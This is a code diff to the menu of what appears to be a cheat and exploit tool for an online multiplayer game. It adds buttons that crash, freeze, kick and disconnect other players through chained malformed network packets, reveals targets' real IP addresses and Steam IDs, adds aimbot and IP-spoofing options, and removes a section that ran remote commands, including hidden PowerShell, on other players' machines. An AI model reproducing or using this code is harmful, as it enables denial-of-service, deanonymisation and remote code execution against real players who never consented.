@@ -133,6 +133,10 @@ namespace menu
 		return result;
 	}
 
+	bool deez = false;
+
+	std::unordered_map<uint64_t, exploit_t> exploits;
+	
 	void draw_player_list(const float width, const float spacing)
 	{
 		if (ImGui::BeginTabItem("Player List"))
@@ -177,16 +181,23 @@ namespace menu
 			for (const auto& client_num : indices)
 			{
 				const auto target_client = session->clients[client_num].activeClient;
+				
+				auto is_valid{ false };
+				
+				if (in_game)
+					is_valid = game::cg()->clients[client_num].infoValid;
+				else
+					is_valid = target_client;
 
-				if (target_client)
+				if (is_valid)
 				{
 					ImGui::AlignTextToFramePadding();
 					ImGui::TextUnformatted(std::to_string(client_num).data());
 
 					ImGui::NextColumn();
 
-					const auto player_xuid = target_client->fixedClientInfo.xuid;
-					const auto player_name = target_client->fixedClientInfo.gamertag;
+					const auto player_xuid = in_game ? game::cg()->clients[client_num].xuid() : target_client->fixedClientInfo.xuid;
+					const auto player_name = in_game ? game::cg()->clients[client_num].name : target_client->fixedClientInfo.gamertag;
 
 					if (in_game)
 					{
@@ -231,14 +242,11 @@ namespace menu
 
 					if (selected)
 					{
-						exploit::lobby_msg::send_connection_test(session, netadr, player_xuid);
 						ImGui::OpenPopup(popup.data());
 					}
 
-					game::XNADDR xn;
-					game::dwNetadrToCommonAddr(netadr, &xn, sizeof xn, nullptr);
-					
-					const auto ip_string = xn.to_string(true);
+					const auto xn = netadr.to_xnaddr();
+					const auto ip_string = netadr.type == game::NA_BAD ? "Invalid" : xn.to_string(true);
 
 					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
 					{
@@ -281,44 +289,60 @@ namespace menu
 							ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
 						}
 
+						if (const auto real_steamid = steam::real_steamid[player_xuid]; real_steamid)
+						{
+							ImGui::SameLine();
+
+							ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%llu)", real_steamid);
+						}
+
 						if (ImGui::MenuItem(ip_string))
 						{
 							ImGui::LogToClipboardUnformatted(ip_string);
 						}
 
+						if (const auto real_ip_string = events::real_addr[netadr]; !real_ip_string.empty())
+						{
+							ImGui::SameLine();
+
+							ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", real_ip_string.data());
+						}
+
 						ImGui::Separator();
 
-						const auto can_connect_to_player = game::can_connect_to_player(session, client_num, player_xuid);
+						const auto can_connect_to_player = netadr.connected();
 
 						if (ImGui::BeginMenu("Crash player##" + std::to_string(client_num)))
 						{
 							static auto freeze = false;
 							ImGui::Checkbox("Freeze", &freeze);
 							
-							if (ImGui::MenuItem("Crash (1)"))
+							if (ImGui::MenuItem("Crash"))
 							{
-								exploit::send_crash(netadr, player_xuid, freeze);
+								std::thread([=]()
+								{
+									exploit::send_crash(netadr, player_xuid, freeze);
+									exploit::send_netchan_freeze(netadr);
+
+									exploit::send_update_svcmd_overflow(netadr, player_xuid);
+									std::this_thread::sleep_for(100ms);
+									const auto to = in_game ? game::clc()->serverAddress : netadr;
+									exploit::send_sv_gamestate_crash(to, player_xuid);
+
+									steam::send_crash(player_xuid);
+
+									DEBUG_LOG("Called");
+								}).detach();
 							}
 
 							if (ImGui::MenuItem("Crash (2)"))
 							{
-								const game::net::netchan::write_packet packet =
-								{
-									game::cl()->serverId,
-									0,
-									0x10000,
-								};
+								DEBUG_LOG("Called1");
 
-								if (in_game)
-								{
-									const auto clc = game::clc();
-									game::net::netchan::write(packet, clc->serverAddress, session->host.info.xuid, player_xuid, false);
-									game::net::netchan::write({ 69, 0, 0x10000 }, clc->serverAddress, session->host.info.xuid, player_xuid, false);
-								}
-								else
-								{
-									game::net::netchan::write(packet, netadr, player_xuid, player_xuid, false);
-								}
+								deez = true;
+								
+								const auto to = in_game ? game::clc()->serverAddress : netadr; 
+								exploit::send_invalid_cmd_sequence_crash(to, player_xuid);
 							}
 
 							ImGui::EndMenu();
@@ -339,11 +363,17 @@ namespace menu
 							if (ImGui::MenuItem("Kick from lobby", nullptr, nullptr, can_connect_to_player))
 							{
 								exploit::send_connect_response_migration_packet(netadr);
+								exploit::lobby_msg::send_disconnect_client(session, player_xuid);
 							}
 
-							if (ImGui::MenuItem("Disconnect client from lobby"))
+							if (ImGui::MenuItem("Disconnect client from lobby (1)"))
 							{
-								exploit::lobby_msg::send_disconnect_client(session, player_xuid);
+								exploit::lobby_msg::send_client_disconnect(session->host.info.netAdr, session->type, player_xuid);
+							}
+
+							if (ImGui::MenuItem("Disconnect client from lobby (2)", nullptr, nullptr, in_game))
+							{
+								exploit::send_connect_from_lobby(game::clc()->serverAddress, player_xuid);
 							}
 
 							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num), can_connect_to_player))
@@ -358,6 +388,45 @@ namespace menu
 								}
 
 								ImGui::EndMenu();
+							}
+
+							ImGui::Separator();
+							
+							if (ImGui::MenuItem("Disconnect client from lobby"))
+							{
+								scheduler::once([=]()
+								{
+									exploit::send_lost_reliable_cmds_kick(netadr, player_xuid);
+								}, scheduler::pipeline::main);
+							}
+
+							if (ImGui::MenuItem("Chat test"))
+							{
+								std::thread([=]()
+								{
+									for (size_t i = 0; i < 128; ++i)
+									{
+										game::net::netchan::write_packet msg{};
+										msg.server_id = game::cl()->serverId;
+										msg.command_sequence = std::numeric_limits<uint16_t>::max();
+										const auto chat_message{ "hello"s };
+
+										if (menu::exploits[player_xuid].completed)
+										{
+											menu::exploits[player_xuid] = {};
+											return;
+										}
+										
+										menu::exploits[player_xuid].chat_message = chat_message;
+										
+										msg.data = "chat 0 " + chat_message;
+
+										msg.acknowledge = i;
+
+										game::net::netchan::write(msg, game::clc()->serverAddress, player_xuid, 1);
+										std::this_thread::sleep_for(250ms);
+									}
+								}).detach();
 							}
 
 							ImGui::EndMenu();
@@ -422,8 +491,12 @@ namespace menu
 					ImGui::Separator();
 
 					ImGui::Checkbox("Silent mode", &aimbot::silent);
+					
+					ImGui::SameLine(width - 100.0f, spacing);
+					ImGui::Checkbox("Asynchronous", &aimbot::asynchronous);
+					
 					ImGui::Checkbox("Auto-fire", &aimbot::auto_fire);
-					ImGui::Checkbox("Legit", &aimbot::legit);
+					ImGui::Checkbox("Predict target movement", &misc::prediction);
 					ImGui::Checkbox("Only bonescan priority targets", &aimbot::priority_bonescan);
 
 					ImGui::EndTabItem();
@@ -475,9 +548,10 @@ namespace menu
 					ImGui::Checkbox("Log instant messages", &events::instant_message::log_messages);
 					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);
 					ImGui::Checkbox("Log server commands", &events::server_command::log_commands);
+					ImGui::Checkbox("Simulate join", &session::simulate_join::enabled);
 					ImGui::Checkbox("Spoof IP address", &events::spoof_ip);
 					ImGui::Checkbox("Prevent join", &events::prevent_join);
-					ImGui::Checkbox("Block steam P2P packets", &steam::block_p2p_packets);
+					ImGui::Checkbox("Block P2P packets", &events::block_p2p_packets);
 					ImGui::Checkbox("Don't update presence", &events::no_presence);
 
 					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
@@ -503,7 +577,6 @@ namespace menu
 						if (ImGui::MenuItem("Send crash", nullptr, nullptr, target_id && !target_steam_id.empty()))
 						{
 							exploit::instant_message::send_friend_message_crash(target_id);
-							exploit::instant_message::send_info_response_overflow(target_id);
 						}
 
 						if (ImGui::MenuItem("Send popup", nullptr, nullptr, target_id && !target_steam_id.empty()))
@@ -512,10 +585,10 @@ namespace menu
 						}
 
 						ImGui::Separator();
-
+						
 						if (ImGui::MenuItem("Endgame"))
 						{
-							game::net::netchan::write("lobbyvm Engine.SendMenuResponse(num:0,str:popup_leavegame,str:endround,);");
+							game::CL_AddReliableCommand(0, ("mr " + std::to_string(game::cl()->serverId) + " 0 endround").data());
 						}
 
 						if (ImGui::MenuItem("Send crash text", nullptr, nullptr, session))
@@ -537,65 +610,17 @@ namespace menu
 							nullptr, 
 							session && game::Live_IsUserSignedInToDemonware(0)))
 						{
-							exploit::send_crash(session->host.info.netAdr, session->host.info.xuid);
-						}
-					}
-
-					if (ImGui::CollapsingHeader("RCE Exploits", ImGuiTreeNodeFlags_Leaf))
-					{
-						const auto set_dvar = [=](const std::string& dvar, const std::string& value)
-						{
-							game::net::netchan::write(utils::string::va("lobbyvm Engine.SetDvar(str:%s,str:%s,);", dvar, value));
-						};
-
-						const auto execute_command_line = [=](const std::string& command)
-						{
-							game::net::netchan::write("lobbyvm os.execute(str:\"" + command + "\",);");
-						};
-
-						const auto execute_command = [=](const std::string& command)
-						{
-							game::net::netchan::write("lobbyvm Engine.Exec(int:0,str:\"" + command + "\",);");
-						};
-						
-						static auto rce_input{ ""s };
-						
-						ImGui::SetNextItemWidth(width * 0.60f);
-						ImGui::InputTextWithHint("##rce_input", "RCE Input", &rce_input); 
-						
-						if (selectable("Execute command line"))
-						{
-							execute_command_line(rce_input);
-						}
-
-						if (selectable("Execute cbuf command"))
-						{
-							execute_command(rce_input);
-						}
-
-						if (selectable("Set dvar", in_game))
-						{
-							if (const auto args = utils::string::split(rce_input, ' '); args.size() > 1)
 							{
-								set_dvar(args[0], args[1]);
+								game::net::netchan::write_packet msg{};
+								msg.server_id = game::cl()->serverId;
+								constexpr auto sequence = INT_MAX;
+								msg.message_sequence = sequence;
+								msg.command_sequence = sequence;
+	
+								game::net::netchan::write(msg, session->host.info.netAdr, game::LiveUser_GetXuid(0), 1);
 							}
-						}
 
-						if (selectable("Fast restart", in_game))
-						{
-							execute_command("fast_restart");
-						}
-
-						if (selectable("Text to speech", in_game))
-						{
-							const auto command = utils::string::va
-							(
-								"powershell.exe "
-								"-WindowStyle hidden Add-Type -AssemblyName System.speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak('%s')",
-								rce_input.data()
-							);
-							
-							execute_command_line("start " + command);
+							exploit::send_crash(session->host.info.netAdr, session->host.info.xuid);
 						}
 					}
 					
@@ -632,7 +657,8 @@ namespace menu
 
 							if (ImGui::Button("Execute##execute_reliable_command", { 64.0f, 0.0f }))
 							{
-								game::CL_AddReliableCommand(0, reliable_command_input.data());
+								//game::CL_AddReliableCommand(0, reliable_command_input.data());
+								game::net::netchan::write(reliable_command_input);
 							}
 						}
 
